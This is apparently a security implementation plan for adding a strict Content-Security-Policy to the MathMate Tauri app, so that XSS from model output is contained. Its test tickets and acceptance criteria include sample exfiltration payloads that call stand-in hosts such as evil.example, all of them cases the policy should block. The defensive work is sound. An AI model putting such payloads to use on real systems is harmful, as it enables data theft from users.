# Implementation Plan: Security — Content-Security-Policy

## 1) Goal

Add a strict Content-Security-Policy to the Tauri webview so a successful XSS in any model-rendered markdown is contained: it can run inline but cannot load remote scripts, exfiltrate via `<script src=>`, or talk to non-allowlisted origins.

`tauri.conf.json` currently ships with `"csp": null`. That means the only thing standing between a successful sanitizer bypass and full remote code execution is DOMPurify — which has had bypasses in the past and is being asked to filter a stream of model output that includes KaTeX and SVG.

This plan ships a CSP that satisfies every current MathMate feature, blocks the dangerous classes of payload, and is documented for future maintainers.

---

## 2) Threat Model (Practical)

- Adversary: prompt-injected model output that slips past DOMPurify (regression, zero-day, or KaTeX edge case).
- Capability sought: load remote script, exfil via `fetch`, talk to attacker-controlled origin.
- Mitigation: CSP that disallows `script-src` outside `'self'`, allows inline styles (KaTeX requires it), allows `https:` for outbound API calls, allows the Tauri IPC origin (`ipc: https://ipc.localhost` in v2).
- Out of scope: native-side IPC hardening (separate plans: `PathScopeGuard`, `MemoryPromptIsolation`).

---

## 3) Scope

### In scope
- Set a non-null `security.csp` in `tauri.conf.json` for production builds.
- Verify every current UI feature still works under the new CSP.
- Document the CSP and the inline-style exception in `docs/SECURITY.md`.
- Make the CSP a `dev`/`prod` split if needed so Vite HMR keeps working in dev.

### Out of scope
- Subresource Integrity (SRI) for the bundled JS (Vite doesn't trivially produce hashes we can pin).
- Trusted Types — Tauri v2's webview support is patchy; revisit if/when Tauri exposes a stable hook.
- Network-level isolation (the OpenRouter call is over `https:` to a configured host; deep hardening is out of scope here).

---

## 4) System Design

### 4.1 Policy

Production CSP (Tauri v2 webview target):

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: asset:;
font-src 'self' data:;
connect-src 'self' ipc: https://ipc.localhost https://openrouter.ai https://api.openai.com https://api.anthropic.com;
object-src 'none';
base-uri 'self';
form-action 'none';
frame-ancestors 'none';
frame-src 'none';
worker-src 'self' blob:;
media-src 'self' blob:;
manifest-src 'self';
```

Rationale per directive:
- `default-src 'self'` — fallback deny.
- `script-src 'self'` — no inline scripts, no remote scripts. MathMate has no inline `<script>` tags; the dev server's HMR is handled in the dev-only CSP below.
- `style-src 'self' 'unsafe-inline'` — KaTeX and `marked-katex-extension` generate inline `style="..."` attributes on every rendered element. DOMPurify is configured to allow inline styles too. This is the only `'unsafe-inline'` exception and is intentional.
- `img-src 'self' data: asset:` — `data:` for inlined image attachments (see `providers.ts:313`) and `asset:` for the Tauri asset protocol used by `load_image`. We intentionally do **not** allow `https:` for images to reduce non-script exfil channels (`<img src="https://attacker/...">`) if sanitizer bypass happens.
- `font-src 'self' data:` — KaTeX fonts are bundled in the npm package; remote font hosts are not required.
- `connect-src 'self' ipc: https://ipc.localhost <providers>` — IPC plus the three model provider hosts. OpenRouter is the default. Add hosts as new providers are enabled; better, derive the list from `~/.mathmate/models.json` at startup and pass a runtime CSP via Tauri's `Manager::set_webview_csp` (Tauri v2 supports this).
- `object-src 'none'` / `frame-src 'none'` / `form-action 'none'` — kill plugin / iframe / form attack surfaces.
- `base-uri 'self'` — prevents `<base href="https://attacker/">` from rewriting relative URLs.
- `worker-src 'self' blob:` — Vite uses blob workers in some configs; `self` covers our own.
- `media-src 'self' blob:` — same reasoning.

### 4.2 Dev / prod split

Tauri reads `csp` from `tauri.conf.json` at build time. For dev, we want HMR and Vite's websocket to work. Two approaches:

**Option 1 — `devUrl` override.** Set the CSP only in the production config and leave dev with no CSP (`null`). Acceptable for a local dev environment; document it.

**Option 2 — Strict dev CSP.** Add `connect-src 'self' ws://localhost:1420 http://localhost:1420` to dev CSP for Vite HMR.

**Recommendation: Option 2.** It's the safer default — even in dev, model output shouldn't be able to phone home to attacker.com.

### 4.3 Runtime provider-host discovery

Tauri v2's `WebviewWindow::set_csp` (or equivalent) lets us update the CSP at runtime. After loading the models config, parse the provider `base_url`s and call `set_csp` with the expanded `connect-src` list. This avoids hardcoding provider hosts and keeps the policy accurate when users add custom providers.

---

## 5) File-by-File Tickets

### S5E1 — Production CSP
**Modify:**
- `mathmate-v2/src-tauri/tauri.conf.json`

**Tasks:**
- Replace `"csp": null` with the policy string from §4.1.
- Confirm build still passes.

### S5E2 — Dev CSP
**Modify:**
- `mathmate-v2/src-tauri/tauri.conf.json` (dev overrides via a top-level `devCsp` if Tauri v2 supports it; otherwise, document the dev-mode exception in SECURITY.md).

**Tasks:**
- If Tauri v2 supports a separate dev CSP, set it with Vite HMR endpoints allowed.
- If not, set a relaxed dev CSP via `set_csp` at app startup when `cfg!(debug_assertions)` is true.

### S5E3 — Runtime provider-host expansion
**Modify:**
- `mathmate-v2/src-tauri/src/lib.rs` (after `get_models_config` runs at startup).

**Tasks:**
- After loading `AppConfigModels`, derive a unique set of origins from each enabled provider's `base_url` (parse with `url::Url`).
- Call the Tauri v2 `set_csp` API with a policy that includes those origins in `connect-src`.
- Cache the resulting CSP per session (re-set on config save).
- New helper: `src-tauri/src/csp.rs` with `build_csp(extra_connect_src: &[String]) -> String`.

### S5E4 — `docs/SECURITY.md` (new)
**New:**
- `docs/mathmate/SECURITY.md`

**Tasks:**
- Threat model summary (single page).
- CSP policy + the inline-style exception rationale.
- Reporting instructions (email / GitHub Security Advisories).
- Links to the relevant Implementation plans: NoEvalOnModelOutput, KeychainKeyStorage, PathScopeGuard, SanitizerHardening, MemoryPromptIsolation, StudyLogPathContainment.

### S5E5 — Regression test
**New:**
- `mathmate-v2/tests/csp.test.mjs` (runs under Playwright or Vitest with jsdom; if neither, document the manual steps).

**Tasks:**
- Verify `<script src="https://evil.example/x.js">` injected into a model response is blocked by the browser.
- Verify KaTeX-rendered inline style attributes continue to work (KaTeX needs inline styles).
- Verify a model-emitted `<img src="data:image/png;base64,...">` renders (image attachments).
- Verify a model-emitted `<img src="https://attacker.example/x.png">` is blocked by CSP.
- Verify a fetch to `https://attacker.example/` is blocked (not in `connect-src`).

---

## 6) Testing Plan

### Manual
- Boot the app, complete a normal chat flow with OpenRouter: streaming, KaTeX rendering, image attachments, wrap-up log. No console errors, no broken fonts.
- Open DevTools, paste a `<script>alert(1)</script>` into a session message via the React DevTools (simulating a sanitizer bypass). Confirm the alert does not run and the script is blocked by CSP.
- In Network tab, confirm a request to a non-allowlisted origin is blocked with a CSP violation error.
- Switch to a non-default provider (e.g., OpenAI). Confirm API calls succeed (origin in `connect-src`).

### CI / build
- `npm run build` passes.
- `cargo check` passes.
- `cargo test` passes (no Rust logic changed, but the CSP module has tests).

### Dogfood
- Add a `playwright` (or `tauri-driver`) check that a window opens and the first chat message renders KaTeX correctly.

---

## 7) Acceptance Criteria

- [ ] `tauri.conf.json` has a non-null `security.csp` in production.
- [ ] Every existing UI feature works in a fresh `npm run tauri build && open` cycle.
- [ ] Adding/removing a provider in Settings updates the runtime CSP without requiring an app restart.
- [ ] A planted `<script src="https://evil.example/x.js">` is blocked by the browser.
- [ ] A planted `fetch("https://evil.example/exfil", {method: "POST", body: ...})` is blocked.
- [ ] A planted `<img src="https://evil.example/exfil.png">` is blocked by CSP `img-src`.
- [ ] `docs/SECURITY.md` exists with the threat model, CSP rationale, and reporting instructions.
- [ ] CHANGELOG and dev log updated.

---

## 8) Rollout Plan

1. Land `csp.rs` helper with unit tests for the connect-src expansion (origin parsing, deduplication, scheme allowlist).
2. Update `tauri.conf.json` with the static policy.
3. Wire `set_csp` call in `lib.rs` startup path.
4. Add `docs/SECURITY.md`.
5. Manual smoke test of every UI surface (chat, settings, viz, quiz, wrap-up, session manager).
6. CHANGELOG entry: "Added (Security): strict Content-Security-Policy in production builds; provider-host list is expanded at runtime from models config."
